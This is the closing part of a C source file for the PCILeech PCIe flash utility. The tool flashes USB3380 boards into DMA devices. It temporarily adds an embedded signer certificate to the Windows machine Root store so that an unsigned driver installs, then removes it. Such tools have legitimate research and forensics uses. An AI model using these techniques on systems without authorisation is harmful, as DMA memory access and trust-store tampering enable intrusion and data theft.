	0x35, 0x32, 0x5a, 0x79, 0x09, 0x9d, 0x7f, 0x4b, 0x8a, 0x72, 0xcc, 0xdb,
	0xf4, 0xee, 0x05, 0x7c, 0xb7, 0x6c, 0x24, 0x3d, 0x7a, 0xce, 0x6a, 0x9d,
	0xf6, 0x43, 0xc7, 0x0c, 0x03, 0xa7, 0x0f, 0x3f, 0xc8, 0xb2, 0x80, 0x13,
	0xe3, 0x8c, 0xf2, 0x16, 0x6e, 0x25, 0xbf, 0x53, 0x9d, 0xfc, 0xaa, 0xce,
	0x2b, 0xa8, 0xd3, 0x88, 0xd2, 0xdc, 0x3f, 0x78, 0x30, 0x24, 0x2a, 0x12,
	0x00, 0x2b, 0x59, 0xbf, 0xf3, 0x96, 0x02, 0x73, 0xae, 0xb9, 0x77, 0x03,
	0xa7, 0x12, 0xde, 0xc3, 0x4d, 0x3d, 0x61, 0xb9, 0xd2, 0x57, 0x4a, 0x37,
	0xf0, 0xca, 0x55, 0x97, 0xc2, 0xbd, 0x8a, 0xb0, 0x97, 0xc5, 0x78, 0x5c,
	0x1a, 0x32, 0x22, 0xba, 0x58, 0xaa, 0x32, 0x4d, 0x9a, 0xf3, 0xe5, 0x93,
	0x54, 0x6d, 0x5a, 0xbb, 0xc2, 0x17, 0xa1, 0x1f, 0x71, 0x83, 0xb9, 0x66,
	0x02, 0xa4, 0xca, 0xf4, 0x03, 0x68, 0xcc, 0x72, 0x64, 0xff, 0x36, 0x80,
	0x06, 0xe7, 0x34, 0xcd, 0x4c, 0xba, 0xb2, 0x3f, 0x2a, 0x2d, 0x5e, 0xfc,
	0x5b, 0x9c, 0x88, 0xa4, 0xbc, 0xec, 0x58, 0x99, 0xe0, 0xaf, 0xb7, 0x35,
	0x6f, 0x4f, 0x37, 0xb5, 0xc8, 0xe0, 0xb4, 0xda, 0x90, 0xb9, 0xdd, 0xaa,
	0x96, 0xb7, 0x3b, 0xfb, 0xbf, 0xad, 0x8d, 0x88, 0x5c, 0xc9, 0xbb, 0xbd,
	0x07, 0x01, 0xf4, 0x11, 0x7a, 0x05, 0x40, 0xbb, 0x15, 0xa5, 0xf5, 0x02,
	0x03, 0x01, 0x00, 0x01, 0xa3, 0x24, 0x30, 0x22, 0x30, 0x0b, 0x06, 0x03,
	0x55, 0x1d, 0x0f, 0x04, 0x04, 0x03, 0x02, 0x04, 0x30, 0x30, 0x13, 0x06,
	0x03, 0x55, 0x1d, 0x25, 0x04, 0x0c, 0x30, 0x0a, 0x06, 0x08, 0x2b, 0x06,
	0x01, 0x05, 0x05, 0x07, 0x03, 0x03, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86,
	0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x03, 0x82, 0x01,
	0x01, 0x00, 0x8a, 0x37, 0x29, 0x13, 0xb2, 0x7b, 0xc3, 0x00, 0xba, 0xec,
	0xe4, 0x4a, 0xcf, 0xab, 0x4b, 0x47, 0x7c, 0xe2, 0x4a, 0x0e, 0x57, 0x63,
	0xd5, 0x3e, 0xc2, 0xa7, 0x3c, 0xf4, 0x89, 0x94, 0x91, 0x3a, 0xd5, 0x72,
	0xf6, 0xdf, 0xae, 0x9f, 0x92, 0xc8, 0xf9, 0xd2, 0xb9, 0x2b, 0xab, 0xed,
	0x8a, 0x8b, 0xa1, 0x6f, 0xa4, 0x4b, 0x78, 0xb0, 0x42, 0xcb, 0xc3, 0xfb,
	0xd8, 0x5a, 0x8e, 0xa0, 0xe6, 0x01, 0x9c, 0x00, 0x0e, 0xeb, 0xd2, 0xd1,
	0x55, 0xf0, 0x4b, 0xd8, 0xd0, 0xc9, 0x3e, 0x27, 0x8e, 0x18, 0xfa, 0x34,
	0xa2, 0xcc, 0xc6, 0x41, 0x96, 0xa8, 0x37, 0xa5, 0xe7, 0x43, 0x8c, 0x85,
	0xbf, 0x31, 0xb8, 0x87, 0x2f, 0xbe, 0xfb, 0x22, 0x84, 0x4b, 0x0e, 0xa5,
	0x4d, 0xad, 0x0e, 0x0e, 0x74, 0x3a, 0x7a, 0xcd, 0xaf, 0x5a, 0x38, 0xe5,
	0xee, 0x56, 0x60, 0x7e, 0x56, 0x4f, 0xd1, 0x78, 0x96, 0x05, 0xa9, 0x9e,
	0x45, 0xa8, 0x93, 0x4d, 0x7d, 0x72, 0x1f, 0x57, 0xf9, 0x94, 0xd2, 0xea,
	0x13, 0x3f, 0xbb, 0x3e, 0x60, 0xf0, 0x6c, 0xcd, 0x41, 0xdb, 0x53, 0x59,
	0xab, 0x49, 0x23, 0xe7, 0x20, 0x13, 0xdc, 0x30, 0x7c, 0x8c, 0xe6, 0x03,
	0x3c, 0xca, 0xf3, 0xa0, 0x82, 0xc0, 0xa1, 0xcd, 0x9b, 0x28, 0x77, 0x78,
	0x74, 0xae, 0x5c, 0x0b, 0xb0, 0xe7, 0x7b, 0xd9, 0x5f, 0xe8, 0xcc, 0xb0,
	0xa2, 0x14, 0x9a, 0xaa, 0x5d, 0x82, 0x77, 0x1d, 0xad, 0x5a, 0x2a, 0xcf,
	0x11, 0xbc, 0xd0, 0xa2, 0x4a, 0x60, 0x09, 0xc7, 0xf3, 0xd4, 0xcc, 0x41,
	0x23, 0x95, 0xe8, 0x9b, 0x22, 0xec, 0xf8, 0x2c, 0xec, 0x7d, 0xa8, 0x94,
	0x60, 0xfd, 0xde, 0x55, 0xde, 0xc9, 0x7c, 0xc0, 0x74, 0xa4, 0x57, 0x4c,
	0x33, 0x61, 0x36, 0xfc, 0xc7, 0x5e, 0xdd, 0x4a, 0xd4, 0xb6, 0x46, 0xda,
	0xba, 0x86, 0xfc, 0x5f, 0xbf, 0x2b
};

BOOL InsertCertificate(_In_ PCCERT_CONTEXT pCert)
{
	BOOL status;
	HCERTSTORE hStoreMachineRoot;
	hStoreMachineRoot = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0, CERT_SYSTEM_STORE_LOCAL_MACHINE, L"Root");
	if(!hStoreMachineRoot) { return FALSE; }
	status = CertAddCertificateContextToStore(hStoreMachineRoot, pCert, CERT_STORE_ADD_USE_EXISTING, NULL);
	CertCloseStore(hStoreMachineRoot, 0);
	return status;
}

BOOL DeleteCertificate(_In_ PCCERT_CONTEXT pCert)
{
	BOOL status = TRUE;
	PCCERT_CONTEXT pCertE = NULL;
	HCERTSTORE hStoreMachineRoot;
	hStoreMachineRoot = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0, CERT_SYSTEM_STORE_LOCAL_MACHINE, L"Root");
	if(!hStoreMachineRoot) { return FALSE; }
	while(pCertE = CertEnumCertificatesInStore(hStoreMachineRoot, pCertE)) {
		if(CertCompareCertificate(X509_ASN_ENCODING, pCert->pCertInfo, pCertE->pCertInfo)) {
			status = CertDeleteCertificateFromStore(pCertE);
			goto cleanup;
		}
	}
	cleanup:
	CertCloseStore(hStoreMachineRoot, 0);
	return status;
}

BOOL RegistrySetDisableDriver(BOOL isDisable) {
	DWORD status, dw;
	HKEY hRegKey;
	status = RegOpenKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WUDF\\Services\\PCILeechFlash", &hRegKey);
	if(status != ERROR_SUCCESS) { return FALSE; }
	dw = isDisable ? 1 : 0;
	status = RegSetValueExA(hRegKey, "disable", 0, REG_DWORD, (PBYTE)&dw, sizeof(DWORD));
	RegCloseKey(hRegKey);
	return status;
}

int main(_In_ int argc, _In_ char* argv[])
{
	BOOL status;
	PCCERT_CONTEXT pCertSigner;
	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);
	printf(
		"PCILeech PCIe flash utility for initial flashing of USB3380          \n" \
		"=====================================================================\n" \
		"This utility is supported on 64-bit Windows 8.1 or Windows 10. Please\n" \
		"note that Windows 7 is not supported.   If this utility fail to flash\n" \
		"please try the Linux based flash utility instead.                    \n" \
		" - PCILeech PCIe flash utility (c) 2016 Ulf Frisk                    \n" \
		" - Version: 1.0                                                      \n" \
		" - License: GNU GENERAL PUBLIC LICENSE - Version 3, 29 June 2007     \n" \
		" - Contact information: pcileech@frizk.net, https://github.com/ufrisk\n" \
		" - System requirements: 64-bit Windows 8.1, 10 or later.             \n" \
		"                                                                     \n" \
		"Installing driver ... Please accept any driver install popups ...    \n");
	RegistrySetDisableDriver(FALSE);
	pCertSigner = CertCreateCertificateContext(X509_ASN_ENCODING, SIGNER_CERTIFICATE, sizeof(SIGNER_CERTIFICATE));
	status = InsertCertificate(pCertSigner);
	if(!status) {
		printf(
			"Installation failed. Could not teporarily insert signer certificate  \n" \
			"into machine root store. Please reboot and try again, or use Linux   \n" \
			"flash module.                                                        \n" \
			"ERROR - Exiting ...                                                  \n" \
			"Please press enter to exit.                                          \n");
		getchar();
		return 0;
	}
	status = DiInstallDriverA(NULL, CONFIG_PATH_INF, 0, FALSE);
	if(!status) {
		printf(
			"Installation failed. Could not install the flash driver due to an un-\n" \
			"known reason. Please reboot and try again, or use Linux flash module.\n" \
			"ERROR - Exiting ...                                                  \n" \
			"Please press enter to exit.                                          \n");
		goto cleanup;
	}
	printf(
		"                                                                     \n" \
		"Driver hopefully installed. Please insert the hardware that should be\n" \
		"flashed into a PCILeech device. Supported hardware is the USB3380-EVB\n" \
		"mini PCIe board and the PP3380 PCIe board.  If flashing is successful\n" \
		"on the USB3380-EVB mini-PCIe board a BLUE LED will light up brightly.\n" \
		"No indication will be given on the PP3380 board. Insert the PCIe side\n" \
		"of the hardware into this computer. The USB side should not be       \n" \
		"connected at this stage.                                             \n" \
		"                                                                     \n" \
		"NB! If flashing the PP3380 PCIe card the J3 jumper must be bridged to\n" \
		"connect the EEPROM.  This is not necessary for the USB3380-EVB board.\n" \
		"                                                                     \n" \
		"Upon successful flashing the device must be power cycled in order for\n" \
		"the flashed changes to take effect.                                  \n" \
		"                                                                     \n" \
		"After flashing is completed please press enter to exit.              \n");
	cleanup:
	getchar();
	status = DeleteCertificate(pCertSigner);
	CertFreeCertificateContext(pCertSigner);
	status = RegistrySetDisableDriver(TRUE);
	return 0;
}

```